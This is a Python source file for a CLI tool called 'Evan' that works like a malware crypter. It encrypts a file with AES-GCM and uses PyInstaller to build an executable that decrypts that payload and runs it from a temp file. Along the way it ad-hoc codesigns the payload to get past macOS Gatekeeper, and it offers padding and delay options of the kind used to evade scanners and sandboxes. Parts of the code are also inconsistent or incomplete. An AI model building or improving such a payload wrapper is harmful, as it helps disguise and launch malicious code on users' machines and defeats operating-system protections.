#!/usr/bin/env python3
"""Evan CLI tool."""

import inspect
import subprocess
import tempfile
import os, stat

import argparse
from pathlib import Path
import sys

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

USAGE_TEXT = """Evan Program Usage:
  --encrypt <target-file>
  --output <output-file>
  --add-size <size-in-mb>
  --delay <seconds>"""

KEY_SIZE = 32   # AES-256
NONCE_SIZE = 12 # Standard GCM nonce size
TAG_SIZE = 16   # Standard GCM authentication tag size


def non_negative_float(value: str) -> float:
    try:
        parsed = float(value)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(f"invalid number: {value!r}") from exc
    if parsed < 0:
        raise argparse.ArgumentTypeError("must be a non-negative number")
    return parsed


def encrypt_file(target_path: Path, output_path: Path) -> bytes:
    """Encrypt target_path with AES-256-GCM and write nonce + tag + ciphertext."""
    plaintext = target_path.read_bytes()
    key = get_random_bytes(KEY_SIZE)
    nonce = get_random_bytes(NONCE_SIZE)

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)

    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(nonce + tag + ciphertext)
    Path(f"{output_path}.key").write_text(key.hex(), encoding="utf-8")
    return ciphertext, key


def decrypt_file(encrypted_path: Path, key_path: Path) -> bytes:
    """Decrypt encrypted_path (nonce + tag + ciphertext) using the hex key in key_path."""
    key = bytes.fromhex(key_path.read_text(encoding="utf-8").strip())
    if len(key) != KEY_SIZE:
        raise ValueError(f"Invalid key size: expected {KEY_SIZE} bytes, got {len(key)}")

    data = encrypted_path.read_bytes()
    header_size = NONCE_SIZE + TAG_SIZE
    if len(data) < header_size:
        raise ValueError("Encrypted file is too short to contain a valid AES-GCM header")

    nonce = data[:NONCE_SIZE]
    tag = data[NONCE_SIZE:header_size]
    ciphertext = data[header_size:]

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)



def build_c(encrypted_path: Path, key_path: Path):

    key = bytes.fromhex(key_path.read_text(encoding="utf-8").strip())
    if len(key) != KEY_SIZE:
        raise ValueError(f"Invalid key size: expected {KEY_SIZE} bytes, got {len(key)}")
    data = encrypted_path.read_bytes()
    header_size = NONCE_SIZE + TAG_SIZE
    if len(data) < header_size:
        raise ValueError("Encrypted file is too short to contain a valid AES-GCM header")

    plain = decrypt_file(encrypted_path, key_path)
    run_plain(plain)


        
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="evan", add_help=False)
    parser.add_argument("-h", "--help", action="store_true")
    parser.add_argument("--encrypt", dest="encrypt", metavar="<target-file>", type=str)
    parser.add_argument("--output", dest="output", metavar="<output-file>", type=str)
    parser.add_argument(
        "--add-size",
        dest="add_size",
        metavar="<size-in-mb>",
        type=non_negative_float,
    )
    parser.add_argument( 
        "--delay",
        dest="delay",
        metavar="<seconds>",
        type=non_negative_float,
    )
    return parser

def compile_function(func, output_name: str, output_dir: str = ".") -> None:
    module = inspect.getmodule(func)
    if module is None:
        raise RuntimeError(f"Cannot resolve module for {func!r}")
    module_name = module.__name__
    func_name = func.__name__

    # Import the real module (pulls in Path, KEY_SIZE, decrypt_file, …)
    # and forward CLI args as Path objects so build_c gets its two arguments.
    script = f"""\
import sys
from pathlib import Path
from {module_name} import {func_name}

if __name__ == "__main__":
    result = {func_name}(*[Path(a) for a in sys.argv[1:]])
    if isinstance(result, (bytes, bytearray)):
        sys.stdout.buffer.write(result)
    else:
        print(result)
"""

    with tempfile.TemporaryDirectory() as tmp:
        tmp = Path(tmp)
        script_path = tmp / f"{output_name}.py"
        script_path.write_text(script)

        subprocess.run(
            [
                sys.executable, "-m", "PyInstaller",
                "--onefile",
                "--name", output_name,
                "--distpath", output_dir,
                "--workpath", str(tmp / "build"),
                "--specpath", str(tmp),
                "--paths", str(Path(module.__file__).parent),
                "--hidden-import", module_name,
                str(script_path),
            ],
            check=True,
        )

def run_plain(plain: bytes, args: list[str] | None = None) -> int:
    args = args or []

    # Heuristic: is it Python source?
    head = plain[:64].lstrip()
    if head.startswith(b"#!") or head.startswith(b"import ") or head.startswith(b"from ") or head.startswith(b"def "):
        with tempfile.NamedTemporaryFile("wb", suffix=".py", delete=False) as f:
            f.write(plain)
            path = f.name
        try:
            return subprocess.run(["python3", path, *args]).returncode
        finally:
            os.unlink(path)

    # Otherwise: assume native binary. Write, chmod, codesign, run.
    with tempfile.NamedTemporaryFile("wb", suffix=".bin", delete=False) as f:
        f.write(plain)
        path = f.name
    try:
        os.chmod(path, os.stat(path).st_mode | stat.S_IXUSR)

        # macOS: ad-hoc sign so Gatekeeper lets it run
        subprocess.run(
            ["codesign", "--force", "--sign", "-", path],
            check=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        return subprocess.run([path, *args]).returncode
    finally:
        os.unlink(path)


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.help or len(sys.argv if argv is None else argv) == (1 if argv is None else 0):
        print(USAGE_TEXT)
        return 0

    if args.encrypt:
        target = Path(args.encrypt)
        if not target.is_file():
            print(f"Error: target file not found: {target}", file=sys.stderr)
            return 1

        output = Path(args.output) if args.output else Path(f"{args.encrypt}.enc")
        ciphertext, key = encrypt_file(target, output)
        print(f"Encrypted {target} -> {output}")
        print(f"Key (hex): {key.hex()}")
        compile_function(build_c, f"{args.encrypt}")
        return 0

    print("Parsed arguments:")
    print(f"  encrypt : {args.encrypt}")
    print(f"  output  : {args.output}")
    print(f"  add_size: {args.add_size}")
    print(f"  delay   : {args.delay}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
